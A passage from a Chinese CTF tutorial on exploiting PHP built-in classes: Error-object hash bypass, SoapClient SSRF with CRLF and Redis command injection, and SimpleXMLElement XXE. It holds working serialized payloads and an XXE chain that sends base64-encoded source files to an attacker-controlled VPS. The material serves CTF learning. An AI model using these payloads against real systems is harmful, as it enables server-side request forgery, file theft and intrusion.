&#123;main&#125;\n可见，$a 和 $b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 __toString 返回的数据包含当前行号。\nException 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7。\nError和Exception类的这一点在绕过在PHP类中的哈希比较时很有用。\n[2020 极客大挑战]Greatphp\n &lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#x27;great&#x27;]))&#123;    unserialize($_GET[&#x27;great&#x27;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;\n​\t\t我们可以将题目代码中的 $syc 和 $lover 分别声明为类似上面的内置类的对象，让这两个对象本身不同（传入的错误代码即可），但是 __toString 方法输出的结果相同即可\n​\t\t由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 include “/flag” 将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过即可\npoc：这里说一下url取反\nURL编码取反绕过\n适用PHP版本：无限制\n当PHP&gt;=7时，可以直接利用取反构造payload\n\nPS C:\\Users\\Administrator&gt; php -r &quot;var_dump(urlencode(~'phpinfo'));&quot;\nCommand line code:1:\nstring(21) &quot;%8F%97%8F%96%91%99%90&quot;\n\n//实际上\n(~%8F%97%8F%96%91%99%90)();\n#phpinfo();\n\n//利用链如下&lt;?php$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;   //~urldecode=/flag$a=new Error($str,1);$b=new Error($str,2);$c = new SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;echo(urlencode(serialize($c)));?&gt;//这里解释以下，为什么要闭合掉&quot;?&gt;&quot;，因为前面可能会有一些报错的信息，所以可以先闭合掉前面的东西，然后再来包含后面的是取反，因为在链里面所以需要用到解码，不用编码绕不过去正则，里面是/flag因为刷题多了都在根目录下面，不在的话正能一步步尝试。\n10.3 SoapClient 类进行 SSRF\nSoapClient 类\nSOAP（简单对象访问协议）是连接Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式，仅限于http/https协议。SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。\n如果想要使用SoapClient类需要在php.ini配置文件里面开启extension=php_soap.dll选项\n类摘要：\nSoapClient &#123;    /* 方法 */    public __construct ( string|null $wsdl , array $options = [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value = null ) : void    public __setLocation ( string $location = &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;\n可以看到，该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。\n该类的构造函数如下：\npublic SoapClient :: SoapClient(mixed $wsdl [，array $options ])\n\n第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。\n第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。\n\n使用 SoapClient 类进行 SSRF\n知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。\n&lt;?php$a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://192.168.91.153:2333/aaa&#x27;, &#x27;uri&#x27;=&gt;&#x27;http://192.168.91.153:2333&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;\nexample：\n首先在192.168.91.153:2333上起一个监听，然后再执行上述代码，就能够成功发送HTTP请求：\nroot@ubuntu18:~# nc -lvp 2333Listening on [0.0.0.0] (family 0, port 2333)Connection from 192.168.91.1 7856 received!POST /aaa HTTP/1.1Host: 192.168.91.153:2333Connection: Keep-AliveUser-Agent: PHP-SOAP/7.4.3Content-Type: text/xml; charset=utf-8SOAPAction: &quot;http://192.168.91.153:2333#a&quot;Content-Length: 387 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;http://192.168.91.153:2333&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\n这里不知为何我开启不了这个类,先看个思路\n但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。\n如下测试代码，我们在HTTP头中插入一个cookie：\n&lt;?php$target = &#x27;http://192.168.91.153:2333/&#x27;;$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;\n执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：\nroot@ubuntu18:~# nc -lvp 2333Listening on [0.0.0.0] (family 0, port 2333)Connection from 192.168.91.1 7858 received!POST / HTTP/1.1Host: 192.168.91.153:2333Connection: Keep-AliveUser-Agent: WHOAMICookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4        # 插入的cookieContent-Type: text/xml; charset=utf-8SOAPAction: &quot;test#a&quot;Content-Length: 365 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;test&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\n利用HTTP协议去攻击Redis：\n&lt;?php$target = &#x27;http://192.168.91.153:2333/&#x27;;$poc = &quot;CONFIG SET dir /var/www/html&quot;;$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;uri&#x27; =&gt; &#x27;hello^^&#x27;.$poc.&#x27;^^hello&#x27;));$b = serialize($a);$b = str_replace(&#x27;^^&#x27;,&quot;\\n\\r&quot;,$b); echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;\n执行代码后，如下图所示，成功插入了Redis命令：\nroot@ubuntu18:~# nc -lvp 2333Listening on [0.0.0.0] (family 0, port 2333)Connection from 192.168.91.1 7860 received!POST / HTTP/1.1Host: 192.168.91.153:2333Connection: Keep-AliveUser-Agent: PHP-SOAP/7.4.3Content-Type: text/xml; charset=utf-8SOAPAction: &quot;helloCONFIG SET dir /var/www/html        # 这里就是Redis命令hello#a&quot;Content-Length: 403 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;helloCONFIG SET dir /var/www/htmlhello&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\n这样我们就可以利用HTTP协议去攻击Redis了。\n对于如何发送POST的数据包，这里面还有一个坑，就是 Content-Type 的设置，因为我们要提交的是POST数据，所以 Content-Type 的值我们要设置为 application/x-www-form-urlencoded，这里如何修改 Content-Type 的值呢？由于 Content-Type 在 User-Agent 的下面，所以我们可以通过 SoapClient 来设置 User-Agent ，将原来的 Content-Type 挤下去，从而再插入一个新的 Content-Type 。\n&lt;?php$target = &#x27;http://192.168.91.153:2333/&#x27;;$post_data = &#x27;data=whoami&#x27;;$headers = array(    &#x27;X-Forwarded-For: 127.0.0.1&#x27;,    &#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;);$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;. (string)strlen($post_data).&#x27;^^^^&#x27;.$post_data,&#x27;uri&#x27;=&gt;&#x27;test&#x27;));$b = serialize($a);$b = str_replace(&#x27;^^&#x27;,&quot;\\n\\r&quot;,$b);echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;\n执行代码后，成功发送POST数据：\nroot@ubuntu18:~# nc -lvp 2333Listening on [0.0.0.0] (family 0, port 2333)Connection from 192.168.91.1 7862 received!POST / HTTP/1.1Host: 192.168.91.153:2333Connection: Keep-AliveUser-Agent: wupcoContent-Type: application/x-www-form-urlencodedX-Forwarded-For: 127.0.0.1Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93Content-Length: 11 data=whoamiContent-Type: text/xml; charset=utf-8SOAPAction: &quot;test#a&quot;Content-Length: 365 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;test&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\n[LCTF 2018]bestphp’s revenge\n题目给了源码(跟着复现一波)\n &lt;?phphighlight_file(__FILE__);$b = &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;name&#x27;])) &#123;    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);?&gt; array(0) &#123; &#125; \n扫一下目录：flag.php\necho &#x27;only localhost can get flag!&#x27;;$flag = &#x27;LCTF&#123;*************************&#125;&#x27;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;       $_SESSION[&#x27;flag&#x27;] = $flag;   &#125;\n这里说说明了需要本地地址访问才能输出flag。\n1. 变量覆盖\n首先我们看到第一个call_user_func()函数里面2个参数我们都可控，因此想到用extract()函数进行变量覆盖，先用var_dump()看一下session的内容：\n\n这里能实现步骤为f赋值为extract，接着post传参b=var_dump，在第一个第一个call_user_func()函数中extract函数多了一个变量b，即extract(b)，由于extract函数的特性，函数内部实际上为extract（b=&gt;var_dump），于是形成$b=var_dump随后name赋值为job，在第二个call_user_func()函数中,构成了var_dump(array(reset($_SESSION), ‘welcome_to_the_lctf2018’))，输出参数中变量的相关信息\n2. session反序列化\n于是我们想通过`ini_set()`函数来构造`ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);`来改变序列化时的处理器，从而使其和反序列化时处理引擎不同，但是这个函数不接受数组,`$_POST`中需要设置参数传输； 所以用`session_start([&#x27;serialize_handler&#x27;=&gt;&#x27;php_serialize&#x27;])`，即POST传入`serialize_handler=php_serialize`来改变处理器，因为`session_start()`中如果提供参数，那么会用其中的项目覆盖会话配置指示中的配置项。即构造 `session_start(serialize_handler=php_serialize)` 就行了。我们可以利用题目中的 `call_user_func($_GET[&#x27;f&#x27;], $_POST);` 函数，传入`GET：/?f=session_start`、`POST：serialize_handler=php_serialize`，实现 `session_start(serialize_handler=php_serialize)` 的调用来修改此页面的序列化引擎为php_serialize。\n3. SoapClient类的利用\nphp中的SoapClient类可以创建soap数据报文，与wsdl接口进行交互。该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。\npublic SoapClient::SoapClient ( mixed $wsdl [, array $options ] )\n其中$options数组下有个user_agent选项，我们可以利用该选项来自定义User-Agent。而在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。\n&lt;?php$target = &quot;http://127.0.0.1/flag.php&quot;;$attack = new SoapClient(null, array(&#x27;location&#x27; =&gt; $target,    &#x27;user_agent&#x27; =&gt; &quot;btis\\r\\nCookie: PHPSESSID=r9i78lda5e28i65bdlcsjb3l06\\r\\n&quot;,    &#x27;uri&#x27; =&gt; &quot;123&quot;));$payload = urlencode(serialize($attack));echo $payload;\n其中有两个必备参数location是要将请求发送到的SOAP服务器的URL，uri 是SOAP服务的目标命名空间。我们将location设置为http://127.0.0.1/flag.php即本地flag.php文件，这个条件满足了flag.php中要求的$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;，uri随便填就好。其中user_agent，是我们用来定义User-Agent，利用CRLF同时传入页面的cookie，使$_SESSION['flag'] = $flag;保存到指定cookie中。\nO%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22btis%0D%0ACookie%3A+PHPSESSID%3Dr9i78lda5e28i65bdlcsjb3l06%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D//注意传入的时候在O前面加了一个|符号，由于序列化与反序列化处理引擎不一样，反序列化时的引擎为PHP，会将|看做键值分隔符，将其后面的内容直接反序列化，也就是在你要解析session文件时，他会将你|后面的内容反序列化\n\n利用php_serialize序列化传入后，并用php反序列化处理后此时session中包含了：一个键名a:1:&#123;s:4:&quot;name&quot;;s:222:&quot;，和一个SoapClient对象\narray(1) &#123;  [&quot;a:1:&#123;s:4:&quot;name&quot;;s:222:&quot;&quot;]=&gt;  object(SoapClient)#1 (5) &#123;    [&quot;uri&quot;]=&gt;    string(3) &quot;123&quot;    [&quot;location&quot;]=&gt;    string(25) &quot;http://127.0.0.1/flag.php&quot;    [&quot;_stream_context&quot;]=&gt;    int(0)    [&quot;_user_agent&quot;]=&gt;    string(52) &quot;JohnCookie: PHPSESSID=c472u8eh63tvqe5kq44o4mq3b1&quot;    [&quot;_soap_version&quot;]=&gt;    int(1)  &#125;&#125;\n但此时还不会触发SSRF，需要触发 __call 方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码：\n$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);\n我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了：\ncall_user_func(call_user_func, array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;));\ncall_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。\n下面我们用extract()将$b覆盖成call_user_func()，reset($_SESSION)就是$_SESSION['name']，所以我们传入name=SoapClient\n最后的call_user_func($b, $a)就变成了call_user_func(array('SoapClient','welcome_to_the_lctf2018')),即call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)。\n因为SoapClient对象中没有welcome_to_the_lctf2018这个方法，就会调用魔术方法__call()从而发送请求，造成SSRF去访问flag.php。\n\n如上图，访问之后，自动发送了http请求，访问session文件，此时PHP反序列化引擎会反序列化你之前输入的内容，于是成功绕过本地地址访问的限制，于是变量flag存入session，然后我们接着访问index.php，页面会输出session文件的内容，回显flag\n这一步由于会触发SSRF请求，因此会等待很久。\n10.4 SimpleXMLElement 类进行 XXE\nSimpleXMLElement 类\nSimpleXMLElement 这个内置类用于解析 XML 文档中的元素。\n官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：\npublic SimpleXMLElement::__construct(    string $data,    int $options = 0,    bool $dataIsURL = false,    string $namespaceOrPrefix = &quot;&quot;,    bool $isPrefix = false)\n其中值得注意的是$data和$data_is_url这两个参数：\n$data：格式正确的XML字符串，或者XML文档的路径或URL（如果$data_is_url为true）。\n$data_is_url：默认情况下$data_is_url为false。使用true指定$data的路径或URL到一个XML文件，而不是字符串数据。\n可以看到通过设置第三个参数 $data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。\n这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。\nexample：\n&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY % remote SYSTEM &quot;http://t6n089.ceye.io&quot;&gt;%remote;]&gt;]&gt;&lt;x&gt;&amp;xee&lt;/x&gt;EOF;$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);var_dump($xml_class);?&gt;\n实现了引用外部实体。同理我们可以让上面代码中的$xml中的内容放到自己的VPS中，然后在新建类对象的时候第一个参数写的是URL地址去实现XML文件的远程载入，这样也能实现XXE。\n[SUCTF 2018]Homework\n题目分析\n先注册账号登陆作业平台。看到一个calc计算器类。有两个按钮，一个用于调用calc类实现两位数的四则运算。另一个用于提交代码。\n\n点击CALC按钮，观察返回的结果和URL\n\n再根据calc类里面的内容，不难判断得知，这里通过module传参去调用calc类，然后剩下3个变量是calc($args1,$method,$args2)函数中参数。\nSimpleXMLElement 类的使用\n首先，我们在vps（124.220.233.26）上构造如下evil.xml、send.xml这两个文件。\nevil.xml：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM &quot;https://VPS/tmp/semd.xml&quot;&gt;%int;%all;%send;]&gt;\nsend.xml：\n&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;https://VPS/?%payl;&#x27;&gt;&quot;&gt;\n然后在url中构造如下：\n/show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true\n然后我们就可以看web日志：（这个作者也是埋坑呢，这里他用的https协议，我们改成http即可）\n\nbase64解码，得到源码\n\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;PHP Homework Platform&lt;/title&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;script type=&quot;application/x-javascript&quot;&gt; addEventListener(&quot;load&quot;, function() &#123; setTimeout(hideURLbar, 0); &#125;, false); function hideURLbar()&#123; window.scrollTo(0,1); &#125; &lt;/script&gt;&lt;link href=&quot;css/font-awesome.min.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot;&gt;&lt;link href=&quot;css/snow.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; /&gt;&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; /&gt;&lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;images/Styles/SyntaxHighlighter.css&quot;&gt;&lt;/link&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- /home/wwwroot/default--&gt;&lt;div class=&quot;snow-container&quot;&gt;\t\t\t  &lt;div class=&quot;snow foreground&quot;&gt;&lt;/div&gt;\t\t\t  &lt;div class=&quot;snow foreground layered&quot;&gt;&lt;/div&gt;\t\t\t  &lt;div class=&quot;snow middleground&quot;&gt;&lt;/div&gt;\t\t\t  &lt;div class=&quot;snow middleground layered&quot;&gt;&lt;/div&gt;\t\t\t  &lt;div class=&quot;snow background&quot;&gt;&lt;/div&gt;\t\t\t  &lt;div class=&quot;snow background layered&quot;&gt;&lt;/div&gt;\t\t\t&lt;/div&gt;&lt;div class=&quot;top-buttons-agileinfo&quot;&gt;&lt;/div&gt;&lt;h1&gt;PHP Homework Platform&lt;/h1&gt;&lt;div class=&quot;main-agileits&quot;&gt;&lt;?php\tinclude(&quot;function.php&quot;);\tinclude(&quot;config.php&quot;);\t$username=w_addslashes($_COOKIE[&#x27;user&#x27;]);\t$check_code=$_COOKIE[&#x27;cookie-check&#x27;];\t$check_sql=&quot;select password from user where username=&#x27;&quot;.$username.&quot;&#x27;&quot;;\t$check_sum=md5($username.sql_result($check_sql,$mysql)[&#x27;0&#x27;][&#x27;0&#x27;]);\tif($check_sum!==$check_code)&#123;\t\theader(&quot;Location: login.php&quot;);\t&#125;?&gt;\t\t&lt;textarea name=&quot;code&quot; class=&quot;php&quot; rows=&quot;20&quot; cols=&quot;55&quot; disabled=&quot;disabled&quot;&gt;&lt;?php readfile(&quot;./calc.php&quot;);?&gt;\t\t&lt;/textarea&gt;\t\t&lt;div class=&quot;top-buttons-agileinfo&quot;&gt;\t\t\t&lt;a href=&quot;show.php?module=calc&amp;args[]=2&amp;args[]=a&amp;args[]=2&quot;&gt;calc&lt;/a&gt;\t\t\t&lt;a href=&quot;submit.php&quot; class=&quot;active&quot;&gt;Submit homework&lt;/a&gt;\t\t&lt;/div&gt;&lt;/div&gt;\t&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery-2.1.4.min.js&quot;&gt;&lt;/script&gt;\t&lt;script class=&quot;javascript&quot; src=&quot;images/Scripts/shBrushPhp.js&quot;&gt;&lt;/script&gt;\t&lt;script class=&quot;javascript&quot;&gt;\t\tdp.SyntaxHighlighter.HighlightAll(&#x27;code&#x27;);\t&lt;/script&gt; &lt;/body&gt;&lt;/html&gt;\nSQL二次注入\nindex.php\n&lt;?php    include(&quot;function.php&quot;);    include(&quot;config.php&quot;);     $username=w_addslashes($_COOKIE[&#x27;user&#x27;]);    $check_code=$_COOKIE[&#x27;cookie-check&#x27;];    $check_sql=&quot;select password from user where username=&#x27;&quot;.$username.&quot;&#x27;&quot;;    $check_sum=md5($username.sql_result($check_sql,$mysql)[&#x27;0&#x27;][&#x27;0&#x27;]);    if($check_sum!==$check_code)&#123;        header(&quot;Location: login.php&quot;);    &#125;?&gt;&lt;?php readfile(&quot;./calc.php&quot;);?&gt;\nfunction.php\n&lt;?php function sql_result($sql,$mysql)&#123;    if($result=mysqli_query($mysql,$sql))&#123;        $result_array=mysqli_fetch_all($result);        return $result_array;    &#125;else&#123;         echo mysqli_error($mysql);         return &quot;Failed&quot;;    &#125;&#125; function upload_file($mysql)&#123;    if($_FILES)&#123;        if($_FILES[&#x27;file&#x27;][&#x27;size&#x27;]&gt;2*1024*1024)&#123;            die(&quot;File is larger than 2M, forbidden upload&quot;);        &#125;        if(is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]))&#123;            if(!sql_result(&quot;select * from file where filename=&#x27;&quot;.w_addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]).&quot;&#x27;&quot;,$mysql))&#123;                $filehash=md5(mt_rand());                if(sql_result(&quot;insert into file(filename,filehash,sig) values(&#x27;&quot;.w_addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]).&quot;&#x27;,&#x27;&quot;.$filehash.&quot;&#x27;,&quot;.(strrpos(w_addslashes($_POST[&#x27;sig&#x27;]),&quot;)&quot;)?&quot;&quot;:w_addslashes($_POST[&#x27;sig&#x27;])).&quot;)&quot;,$mysql)==&quot;Failed&quot;)                     die(&quot;Upload failed&quot;);                $new_filename=&quot;./upload/&quot;.$filehash.&quot;.txt&quot;;                move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $new_filename) or die(&quot;Upload failed&quot;);                die(&quot;Your file &quot;.w_addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]).&quot; upload successful.&quot;);            &#125;else&#123;                $hash=sql_result(&quot;select filehash from file where filename=&#x27;&quot;.w_addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]).&quot;&#x27;&quot;,$mysql) or die(&quot;Upload failed&quot;);                $new_filename=&quot;./upload/&quot;.$hash[0][0].&quot;.txt&quot;;                move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $new_filename) or die(&quot;Upload failed&quot;);                die(&quot;Your file &quot;.w_addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]).&quot; upload successful.&quot;);            &#125;        &#125;else&#123;            die(&quot;Not upload file&quot;);        &#125;    &#125;&#125;   function w_addslashes($string)&#123;    return addslashes(trim($string));&#125;   function do_api($module,$args)&#123;    $class = new ReflectionClass($module);    $a=$class-&gt;newInstanceArgs($args);&#125;?&gt;\nshow.php\n&lt;?php    include(&quot;function.php&quot;);    include(&quot;config.php&quot;);    include(&quot;calc.php&quot;);    if(isset($_GET[&#x27;action&#x27;])&amp;&amp;$_GET[&#x27;action&#x27;]==&quot;view&quot;)&#123;        if($_SERVER[&quot;REMOTE_ADDR&quot;]!==&quot;127.0.0.1&quot;) die(&quot;Forbidden.&quot;);        if(!empty($_GET[&#x27;filename&#x27;]))&#123;            $file_info=sql_result(&quot;select * from file where filename=&#x27;&quot;.w_addslashes($_GET[&#x27;filename&#x27;]).&quot;&#x27;&quot;,$mysql);            $file_name=$file_info[&#x27;0&#x27;][&#x27;2&#x27;];            echo(&quot;file code: &quot;.file_get_contents(&quot;./upload/&quot;.$file_name.&quot;.txt&quot;));            $new_sig=mt_rand();            sql_result(&quot;update file set sig=&#x27;&quot;.intval($new_sig).&quot;&#x27; where id=&quot;.$file_info[&#x27;0&#x27;][&#x27;0&#x27;].&quot; and sig=&#x27;&quot;.$file_info[&#x27;0&#x27;][&#x27;3&#x27;].&quot;&#x27;&quot;,$mysql);            die(&quot;&lt;br&gt;new sig:&quot;.$new_sig);        &#125;else&#123;            die(&quot;Null filename&quot;);        &#125;    &#125;     $username=w_addslashes($_COOKIE[&#x27;user&#x27;]);    $check_code=$_COOKIE[&#x27;cookie-check&#x27;];    $check_sql=&quot;select password from user where username=&#x27;&quot;.$username.&quot;&#x27;&quot;;    $check_sum=md5($username.sql_result($check_sql,$mysql)[&#x27;0&#x27;][&#x27;0&#x27;]);    if($check_sum!==$check_code)&#123;        header(&quot;Location: login.php&quot;);    &#125;     $module=$_GET[&#x27;module&#x27;];    $args=$_GET[&#x27;args&#x27;];    do_api($module,$args);?&gt;\nshow.php中，限制了 ip 只能是127.0.0.1，说明只能通过 XXE 去触发SSRF。这里根据filename获取数据库中的 sig 然后进行 update 操作，但没有对 sig 值进行过滤，导致二次注入。\n再看一下function.php中的upload_file()上传文件部分，首先他会判断 filename 是否存在，如果不存在就会插入数据库，这里 sig 没有用单引号保护，但是用了 addslashes() 进行转义，而我们要插入二次注入的语句必须得有单引号，这个时候就可以用 hex 编码进行绕过。\n因为sql_result()函数中会输出 sql 错误，所以我们用 updatexml 函数进行报错注入。构造 